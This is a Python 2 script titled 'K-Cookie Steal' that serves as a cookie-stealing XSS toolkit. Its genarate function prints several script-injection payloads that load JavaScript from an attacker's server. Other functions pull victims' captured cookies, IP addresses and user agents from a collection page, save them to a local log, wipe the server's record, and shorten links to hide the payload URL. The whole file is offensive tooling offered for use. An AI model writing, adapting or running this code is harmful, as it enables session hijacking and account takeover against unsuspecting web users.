import requests,re,sys,urllib,urllib2,os,base64
import signal
def register():
    if os.path.isfile('info.txt') == True:
        f = open('info.txt','rb')
        return f.readline()
    else:
        print "*" * 50
        print "\t Use link server ! :D "
        print '\t Vd : http://google.com'
        print "*" * 50
        linkserver = raw_input("Link server: ")
        f = open('info.txt','w')
        try:
            f.write(linkserver)
            f.close()
        except:
            print ':( cant write file '
            exit
        
auto = False
exitauto = False
url = str(register())+'/clogkai.html'
clearl = str(register())+'/clear.php'

def banner():
    print '-'*70
    print '    __ __             ______            __   _         _____ __             __'
    print '   / //_/            / ____/___  ____  / /__(_)__     / ___// /____  ____ _/ /'
    print '  / ,<     ______   / /   / __ \/ __ \/ //_/ / _ \    \__ \/ __/ _ \/ __ `/ / '
    print ' / /| |   /_____/  / /___/ /_/ / /_/ / ,< / /  __/   ___/ / /_/  __/ /_/ / /  '
    print '/_/ |_|            \____/\____/\____/_/|_/_/\___/   /____/\__/\___/\__,_/_/   '

    print '                                           Coded By KAI - Ceh.vn '
    print '-'*70

def signal_handler(signal, frame):
    print 'You pressed Ctrl+C!'
    exitauto = True
    sys.exit()
def genarate(url):
    gex = ('\nNo Filter Evasion: <SCRIPT SRC='+url+'></SCRIPT>\n\n'
           'Non-alpha-non-digit XSS: <SCRIPT/XSS SRC="'+url+'"></SCRIPT>\n\n'
           'No closing script tags: <SCRIPT SRC='+url+'url?< B >\n')
    return gex

def readlogs():
    try:
        print 'Reading ...'
        if os.path.isfile('logs-cookie.txt') == True:
           os.system(['cat logs-cookie.txt','logs-cookie.txt'][os.name == 'nt'])
        else:
             print 'No logs !!!!!!!!!'
    except:
        print "Not Read logs !"
def urlshort(urls):
    url = 'http://is.gd/create.php'
    data = urllib.urlencode({'url' : urls,
                             'shorturl'  : '',
                             'opt' : '0'})
    req = urllib2.Request(url=url,data=data)
    try:
        content = urllib2.urlopen(req).read()
    except:
        print 'No connect Internet ? or Web url shorter die :v '
        exit
    urls = content[content.index('value=')+7:content.index('onselect')-2]
    return urls
def cls():
    os.system(['clear','cls'][os.name == 'nt'])
def logs(ip,port,agent,ref,date,cookie):
    if exitauto == True:
        exit()
    try:
        p = open('logs-cookie.txt','a+')
        p.write('\n ---------------------------------------------------------------------------------\n')
        p.write('IP: ' +ip+'\n')
        p.write('Port: ' +port+'\n')

        p.write('Agent: '+agent+'\n')
        p.write('Host:'+ref+'\n')
        p.write('Date: '+date+'\n')
        p.write('Cookie: '+cookie+'\n')
        p.write('\n ----------------------------------------------------------------------------------\n')
        p.close()
        print 'Save log ok'
    except:
        print 'Not save logs'
def getcookie(url):
    try:
        r = urllib.urlopen(url).read()
        ip = re.findall('IP: (\S+)',r)
        port = re.findall('PORT: (\S+)',r)
        agent =  re.findall('Agent: (\S+) (\D+)',r)
        ref = re.findall('REF: (\S+)',r)
        date = r[r.index('DATE{ : }'):r.index('| COOKIE: ')].split('DATE{ : }')
        cookie = r[r.index("COOKIE:"):].split('<br>')
    except:
        if auto == True:
            pass
        else:
            print '[-] Error Get :b'
    try:
        print 'Ip: %s' % ip[0]
        print 'Port: %s' % port[0]
        print 'Agent: %s' % agent
        print 'Host: %s' % ref[0]
        print 'Date: %s' % date[1]
        print cookie[0]
        logs(ip[0],port[0],str(agent),ref[0],date[1],cookie[0])
        clear(clearl)
        return True
    except:
        if auto == True:
            pass
        else:
            print '[-] No print logs:b'


def  clear(clearl):
    r = urllib.urlopen(clearl).read()
    try:
        print 'OK clear Log'
    except:
        print 'No clear log error'
def autogetcookie():
    while True:
        if exitauto == True:
            sys.exit()
        signal.signal(signal.SIGINT, signal_handler)
        try:
            getcookie(url) == True
        except:
            pass
def changeurl():
    curl = raw_input('New url server: ')
    try:
        f = open('info.txt','wb')
        f.write(curl)
        f.close()
        print 'Ok change new url :d'
    except:
        print 'Error :('


if __name__ == "__main__":
    register()
    banner()
    helpm  = ('\n [Command All list] \n\n'
              '[+] get: Gets cookie              \n'
              '[+] auto: Auto gets cookie      \n'
              '[+] urlshort: url short link :b          \n'
              '[+] help: help command \n'
              '[+] generate: generate code xss\n'
              '[+] clear: clear console\n'
              '[+] readlog: Read logs cookie\n'
              '[+] exit: exit program   \n'
              '[+] showlink: show url server \n'
              '[+] changeurl: change url server \n')
    print '\n'
    while True:
        signal.signal(signal.SIGINT, signal_handler)
        try:
            command = raw_input('Command : ')
        except:
            print "\nExit command :v\n"
        if command == 'get':
            getcookie(url)
        elif command == 'exit':
            print 'Quit ok :3 bye bye ! '
            sys.exit()
        elif command == 'auto':
            auto = True
            autogetcookie()
        elif command == 'urlshort':
            print '-'*20
            print 'Url shorter :b'
            print '-'*20+'\n'
            urls = raw_input("Nhap url: ")
            try:
                print '\nUrl: %s\n' % urlshort(urls)
            except:
                print ':b ! no gets urlshort'
                exit
        elif command == 'help':
            print helpm
        elif command == 'generate':
            print '-'*30
            print 'Genarate xss code :b'
            print '-'*30
            print '\nVd: http://sample.com/xss.js\n'
            url = raw_input("Url link js: ")
            print genarate(url)
        elif  command == 'clear':
            cls()
            banner()
        elif command == 'readlog':
            if os.name == 'nt':
                print 'Read logs windows name logs: logs-cookie.txt'
            else:
                print 'Read logs linux name logs: logs-cookie.txt'
            readlogs()
            exit
        elif command == 'showlink':
            print 'Link Server: ' + url
        elif command == 'changeurl':
            try:
                changeurl()
                print '[+] Change new ok !'
                print '\n Renews tools !'
                print 'exit.....'
                exit()
            except:
                print 'error !'
        else:
            print "No command :v , now 'help' view command "






